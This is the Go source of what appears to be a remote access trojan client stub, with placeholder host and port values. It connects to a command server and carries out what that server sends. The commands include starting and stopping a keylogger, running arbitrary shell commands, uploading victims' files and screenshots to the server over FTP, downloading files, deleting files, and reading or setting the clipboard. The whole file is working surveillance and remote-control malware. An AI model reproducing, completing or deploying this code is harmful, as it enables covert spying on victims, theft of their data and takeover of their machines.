package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"image/png"
	"io/ioutil"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/atotto/clipboard"
	"github.com/jlaffaye/ftp"
	"github.com/kbinani/screenshot"
	"github.com/moutend/go-hook/pkg/keyboard"
	"github.com/moutend/go-hook/pkg/types"
	"github.com/shirou/gopsutil/cpu"
	"github.com/shirou/gopsutil/disk"
	"github.com/shirou/gopsutil/mem"
)

var Host = "{STUB_HOST}"
var Port = "{STUB_PORT}"
var KeyLoggerDone chan bool

type File struct {
	Name    string `json:"name"`
	Content string `json:"content"`
}

type Reply struct {
	Message string `json:"message"`
}
type ServerReply struct {
	Cmd  string   `json:"cmd"`
	Args []string `json:"args"`
}

type SystemInfo struct {
	CPUInfo     []cpu.InfoStat
	MemoryInfo  *mem.VirtualMemoryStat
	DiskUsage   []disk.PartitionStat
	NetworkInfo []net.Interface
}

func String(s SystemInfo) string {
	var sb strings.Builder

	sb.WriteString("CPU Info:\n")
	for _, info := range s.CPUInfo {
		sb.WriteString(" 	- Model Name: " + info.ModelName + "\n")
		sb.WriteString("    - Cores: " + strconv.Itoa(int(info.Cores)) + "\n")
		sb.WriteString("    - Frequency: " + strconv.FormatFloat(info.Mhz, 'f', 2, 64) + " MHz\n")
		sb.WriteString("    - Vendor ID: " + info.VendorID + "\n")
		sb.WriteString("    - CPU Family: " + info.Family + "\n")
		sb.WriteString("    - CPU Model: " + info.Model + "\n")
		sb.WriteString("    - CPU Stepping: " + strconv.Itoa(int(info.Stepping)) + "\n")
		sb.WriteString("    - CPU Flags: " + strings.Join(info.Flags, ", ") + "\n")

	}

	sb.WriteString("\nMemory Info:\n")
	sb.WriteString(fmt.Sprintf("  - Total: %v GB\n", float64(s.MemoryInfo.Total)/1024/1024/1024))
	sb.WriteString(fmt.Sprintf("  - Available: %v GB\n", float64(s.MemoryInfo.Available)/1024/1024/1024))
	sb.WriteString(fmt.Sprintf("  - Used: %v GB\n", float64(s.MemoryInfo.Used)/1024/1024/1024))
	sb.WriteString(fmt.Sprintf("  - Free: %v GB\n", float64(s.MemoryInfo.Free)/1024/1024/1024))
	sb.WriteString(fmt.Sprintf("  - Percentage Used: %.2f%%\n", float64(s.MemoryInfo.UsedPercent)))

	sb.WriteString("\nDisk Usage:\n")
	for _, usage := range s.DiskUsage {
		sb.WriteString(fmt.Sprintf("  - Device: %v\n", usage.Device))
		sb.WriteString(fmt.Sprintf("    - Mountpoint: %v\n", usage.Mountpoint))
		sb.WriteString(fmt.Sprintf("    - Filesystem: %v\n", usage.Fstype))
	}

	sb.WriteString("\nNetwork Info:\n")
	for _, info := range s.NetworkInfo {
		sb.WriteString(fmt.Sprintf("  - Name: %v\n", info.Name))
		sb.WriteString(fmt.Sprintf("    - Hardware Address: %v\n", info.HardwareAddr))
		sb.WriteString(fmt.Sprintf("    - Flags: %v\n", info.Flags))
		sb.WriteString(fmt.Sprintf("    - MTU: %v\n", info.MTU))
		sb.WriteString(fmt.Sprintf("    - Index: %v\n", info.Index))

	}

	return sb.String()
}
func GetSystemInfo() (*SystemInfo, error) {
	// Retrieve CPU information
	cpuInfo, err := cpu.Info()
	if err != nil {
		return nil, fmt.Errorf("failed to retrieve CPU info: %w", err)
	}

	// Retrieve memory information
	memoryInfo, err := mem.VirtualMemory()
	if err != nil {
		return nil, fmt.Errorf("failed to retrieve memory info: %w", err)
	}

	// Retrieve disk usage information
	diskUsage, err := disk.Partitions(false)
	if err != nil {
		return nil, fmt.Errorf("failed to retrieve disk partitions: %w", err)
	}

	// Retrieve network interface information
	networkInfo, err := net.Interfaces()
	if err != nil {
		return nil, fmt.Errorf("failed to retrieve network interfaces: %w", err)
	}

	return &SystemInfo{
		CPUInfo:     cpuInfo,
		MemoryInfo:  memoryInfo,
		DiskUsage:   diskUsage,
		NetworkInfo: networkInfo,
	}, nil
}

func KeyLogger(done chan bool) {
	fmt.Println("Goroutine started")
	defer fmt.Println("Goroutine stopped")
	keyboardChan := make(chan types.KeyboardEvent, 100)

	if err := keyboard.Install(nil, keyboardChan); err != nil {
		return
	}

	defer keyboard.Uninstall()

	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, os.Interrupt)

	fmt.Println("start capturing keyboard input")
	for {
		select {
		case <-done:
			return
		default:
			select {
			case <-time.After(5 * time.Minute):
				fmt.Println("Received timeout signal")
				return
			case <-signalChan:
				fmt.Println("Received shutdown signal")
				return
			case k := <-keyboardChan:
				fmt.Printf("Received %v %v\n", k.Message, k.VKCode.String())
				continue
			}
		}
	}
}

func UploadFile(filePath, usr, pwd, port string, conn net.Conn) error {
	c, err := ftp.Dial(strings.Split(Host, ":")[0]+":"+port, ftp.DialWithTimeout(5*time.Second))
	if err != nil {
		return err
	}

	err = c.Login(usr, pwd)
	if err != nil {
		return err
	}

	filecontents, err := os.ReadFile(filePath)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return err

	} else {
		err = c.Stor(filepath.Base(filePath), bytes.NewReader(filecontents))
		if err != nil {
			fmt.Println("Error uploading file:", err)
			json.NewEncoder(conn).Encode(Reply{
				Message: "Error uploading file",
			})

		}

		c.Logout()
		c.Quit()
		return nil
	}
}
func DownloadFile(filename, savePath string, conn net.Conn) error {
	c, err := ftp.Dial(strings.Split(Host, ":")[0]+":2122", ftp.DialWithTimeout(5*time.Second))
	if err != nil {
		return err
	}

	err = c.Login("downloads", "downloads")
	if err != nil {
		return err
	} else {
		res, err := c.Retr(filename)
		if err != nil {
			fmt.Println("Error downloading file:", err)
			return err
		}
		buf, err := ioutil.ReadAll(res)
		if err != nil {
			fmt.Println("Error reading file contents:", err)
			return err
		}
		saveFileName := filepath.Join(savePath, filepath.Base(strings.TrimSpace(filename)))
		err = ioutil.WriteFile(saveFileName, buf, 0644)
		if err != nil {
			fmt.Println("Error saving file:", err)
			return err
		}

	}
	c.Logout()
	c.Quit()
	return nil

}

func NewScreenShot(filename string, displayId int, conn net.Conn) error {
	tempDir := os.TempDir()
	img, err := screenshot.CaptureDisplay(displayId)
	if err != nil {
		fmt.Println("Failed to capture screen:", err)
		return err
	}
	tempFilePath := filepath.Join(tempDir, filename)

	// Save the captured image to a file
	file, err := os.Create(tempFilePath)
	if err != nil {
		fmt.Println("Failed to create file:", err)
		return err
	}

	err = png.Encode(file, img)
	if err != nil {
		fmt.Println("Failed to encode image:", err)
		return err
	}

	fmt.Println("Screenshot saved to screenshot.png")
	err = UploadFile(tempFilePath, "screenshots", "screenshots", "2123", conn)
	if err != nil {
		fmt.Println("Error uploading screenshot:", err)
		return err
	}
	return nil
}

func main() {
	conn, err := net.Dial("tcp", Host+":"+Port)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer conn.Close()

	fmt.Println("Connected to server")

	readFromServer(conn)

	select {}
}

func FormatPath(baseDir string) string {
	formattedPath := filepath.Join(baseDir)

	normalizedPath, err := filepath.Abs(formattedPath)
	if err != nil {
		fmt.Println("Error normalizing file path:", err)
		return ""
	}

	canonicalPath, err := filepath.EvalSymlinks(normalizedPath)
	if err != nil {
		fmt.Println("Error canonicalizing file path:", err)
		return ""
	}

	return canonicalPath
}

func readFromServer(conn net.Conn) {
	buf := make([]byte, 1024)

	for {
		n, err := conn.Read(buf)
		if err != nil {
			if err == net.ErrClosed {
				fmt.Println("Server closed the connection")
			} else {
				fmt.Println("Error reading from server:", err)
				conn.Close()
				os.Exit(0)
			}
			return
		}

		msg := string(buf[:n])
		fmt.Println("Received from server:", msg)
		if msg == "ping" {
			_, err = conn.Write([]byte("pong"))
			if err != nil {
				fmt.Println(err)
				return
			}
		} else {
			var serverReply ServerReply
			err := json.Unmarshal([]byte(msg), &serverReply)
			if err != nil {
				fmt.Println("Error unmarshaling server reply:", err)
				json.NewEncoder(conn).Encode(Reply{
					Message: "Error unmarshaling server reply",
				})
				return
			}
			Cmd := serverReply.Cmd
			if Cmd == "kill" {
				_, err = conn.Write([]byte("killed"))
				if err != nil {
					fmt.Println(err)
					return
				}
				fmt.Println("Received kill command from server, shutting down client...")
			}
			if Cmd == "cwd" {
				CurrentDirectory, err := os.Getwd()
				if err != nil {
					fmt.Println("Error getting current directory:", err)
					return
				}
				json.NewEncoder(conn).Encode(Reply{
					Message: CurrentDirectory,
				})
				if err != nil {
					fmt.Println(err)
					return
				}
			}
			if Cmd == "klogstart" {
				if KeyLoggerDone != nil {
					json.NewEncoder(conn).Encode(Reply{
						Message: "Keylogger is already running",
					})
					continue
				}
				KeyLoggerDone = make(chan bool)
				go KeyLogger(KeyLoggerDone)
				json.NewEncoder(conn).Encode(Reply{
					Message: "Keylogger started",
				})
			}
			if Cmd == "klogstop" {

				if KeyLoggerDone == nil {
					json.NewEncoder(conn).Encode(Reply{
						Message: "Keylogger is not running",
					})
					continue
				}
				KeyLoggerDone <- true
				KeyLoggerDone = nil
				json.NewEncoder(conn).Encode(Reply{
					Message: "Keylogger stopped",
				})
			}
			if Cmd == "chdir" {
				newDir := serverReply.Args[0]
				err := os.Chdir(FormatPath(newDir))
				if err != nil {
					fmt.Println("Error Changing Working Directory:", err)
					json.NewEncoder(conn).Encode(Reply{
						Message: "Error Changing Working Directory: " + err.Error(),
					})
				} else {
					json.NewEncoder(conn).Encode(Reply{
						Message: "Working directory changed to: " + newDir,
					})
				}
			}
			if Cmd == "lsdir" {

				files, err := os.ReadDir(FormatPath(serverReply.Args[0]))
				if err != nil {
					fmt.Println("Error reading directory:", err)
					json.NewEncoder(conn).Encode(Reply{
						Message: "Error reading directory",
					})
				} else {
					var fileNames []string
					for _, file := range files {
						fileNames = append(fileNames, file.Name())
					}

					json.NewEncoder(conn).Encode(Reply{
						Message: strings.Join(fileNames, ","),
					})
				}

			}
			if Cmd == "upfile" {
				filepath := serverReply.Args[0]
				err = UploadFile(filepath, "uploads", "uploads", "2121", conn)
				if err != nil {
					json.NewEncoder(conn).Encode(Reply{
						Message: "Error uploading file: " + err.Error(),
					})
				} else {
					json.NewEncoder(conn).Encode(Reply{
						Message: "File uploaded successfully",
					})
				}

			}
			if Cmd == "dlfile" {
				filename := serverReply.Args[0]
				savePath := serverReply.Args[1]

				err := DownloadFile(filename, savePath, conn)
				if err != nil {
					fmt.Println("Error downloading file:", err)
					json.NewEncoder(conn).Encode(Reply{
						Message: err.Error(),
					})

				} else {
					json.NewEncoder(conn).Encode(Reply{
						Message: "File downloaded successfully",
					})
				}

			}
			if Cmd == "delfile" {
				filepath := serverReply.Args[0]
				err := os.Remove(filepath)
				if err != nil {
					json.NewEncoder(conn).Encode(Reply{
						Message: "Error deleting file: " + err.Error(),
					})
				} else {
					json.NewEncoder(conn).Encode(Reply{
						Message: "File deleted successfully",
					})
				}
			}
			if Cmd == "exec" {
				var cmd *exec.Cmd
				command := serverReply.Args[0]
				if runtime.GOOS == "windows" {
					cmd = exec.Command("cmd.exe", "/c", command)
				} else {
					cmd = exec.Command("/bin/sh", "-c", command)
				}
				output, err := cmd.CombinedOutput()
				if err != nil {
					json.NewEncoder(conn).Encode(Reply{
						Message: "Error executing command: " + err.Error(),
					})
				} else {
					json.NewEncoder(conn).Encode(Reply{
						Message: string(output),
					})
				}
			}
			if Cmd == "screenshot" {
				filename := serverReply.Args[0] + ".png"
				displayId := serverReply.Args[1]
				dpid, err := strconv.Atoi(displayId)
				if err != nil {
					json.NewEncoder(conn).Encode(Reply{
						Message: "Error parsing display ID: " + err.Error(),
					})
					return
				}
				err = NewScreenShot(filename, dpid, conn)
				if err != nil {
					json.NewEncoder(conn).Encode(Reply{
						Message: "Error taking screenshot: " + err.Error(),
					})
				} else {
					json.NewEncoder(conn).Encode(Reply{
						Message: "Screenshot taken successfully and sent to server [" + filename + "]",
					})
				}
			}

			if Cmd == "clipboardST" {
				clipboard, err := clipboard.ReadAll()
				if err != nil {
					json.NewEncoder(conn).Encode(Reply{
						Message: "Error reading clipboard: " + err.Error(),
					})
					return
				}
				json.NewEncoder(conn).Encode(Reply{
					Message: clipboard,
				})
			}
			if Cmd == "clipboardGT" {
				err := clipboard.WriteAll(serverReply.Args[0])
				if err != nil {
					json.NewEncoder(conn).Encode(Reply{
						Message: "Error setting clipboard: " + err.Error(),
					})
					return
				}
				json.NewEncoder(conn).Encode(Reply{
					Message: "Clipboard set successfully",
				})
			}
			if Cmd == "sysinfo" {
				systemInfo, err := GetSystemInfo()
				if err != nil {
					json.NewEncoder(conn).Encode(Reply{
						Message: "Error getting system info: " + err.Error(),
					})
					return
				} else {
					json.NewEncoder(conn).Encode(Reply{
						Message: String(*systemInfo),
					})
				}
			}
		}

	}
}

func sendString(conn net.Conn, str string) error {
	buf := []byte(str)
	_, err := conn.Write(buf)
	return err
}
